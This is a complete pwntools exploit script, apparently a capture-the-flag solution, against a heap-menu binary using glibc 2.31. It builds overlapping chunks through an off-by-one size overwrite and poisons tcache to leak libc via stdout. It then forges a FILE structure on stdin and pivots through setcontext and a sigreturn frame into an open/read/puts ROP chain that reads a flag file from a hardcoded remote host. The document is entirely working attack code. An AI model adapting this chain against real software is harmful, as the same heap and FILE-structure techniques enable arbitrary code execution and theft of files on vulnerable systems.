from pwn import*
context.arch = 'AMD64'
def menu(ch):
	p.sendlineafter('Choice:',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('Size:',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index:',str(index))
	p.sendafter('Message',content)
def free(index):
	menu(3)
	p.sendlineafter('Index:',str(index))
def E(index,content):
	menu(5)
	p.sendlineafter('Index:',str(index))
	p.sendafter('Message',content)
p = process('./main')
p = remote('119.3.154.59',9777)
libc = ELF('./libc-2.31.so')
new(0x30) #0
new(0x28) #1
new(0xF0) #2
new(0xF0) #3
new(0xF0) #4
new(0xF0) #5
new(0x28) #6
new(0x28) #7
edit(0,'F'*0x28 + p32(0x431))
edit(1,'M'*0x28)
free(2)
new(0xF0)  #2
new(0xF0)  #8
new(0xF0)  #9
new(0xF0)  #10
new(0x28)  #11

edit(1,'M'*0x28)
free(2)
new(0xF0)  #2
new(0xF0)  #12
new(0x1F0) #13
new(0x28)  #14
new(0x1F0)  #15
for i in range(6):
	new(0xF0) #16
for i in range(6):
	free(16 + i)
free(3)
edit(8,'F'*0x10)
free(8)
E(12,'\xA0\x36')
new(0xF0) # 3
new(0xF0) # 8 stdout
E(8,p64(0xFBAD1800) + p64(0)*3 + '\x08')
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
###########3
pop_rdi_ret = libc_base + 0x0000000000026B72
pop_rdx_r12 = libc_base + 0x000000000011C1E1
pop_rsi_ret = libc_base + 0x0000000000027529
pop_rax_ret = libc_base + 0x000000000004A550
jmp_rsi  = libc_base + 0x00000000001105BD


syscall = libc_base + libc.sym['syscall']

target = libc_base + libc.sym['_IO_2_1_stdin_']
address = libc.sym['__free_hook'] + libc_base
IO_str_jumps = libc_base + 0x1ED560
frame_address = target + 0xE0

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
free_hook = address
IO  = '\x00'*0x28
IO += p64(frame_address)
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)
read = libc_base + libc.sym['read']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x2000
frame.rsp = address
frame.rip = Read


orw  = p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_r12) + p64(0x30) + p64(0)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
IO += str(frame)
free(15)
free(13)
edit(9,p64(target))
new(0x1F8) # 13
new(0x1F8) # 15 target
E(15,IO + 'F'*0x18 + p64(libc_base + libc.sym['setcontext'] + 61))

p.sendlineafter('Choice:','4')
p.sendline(orw)
p.interactive()
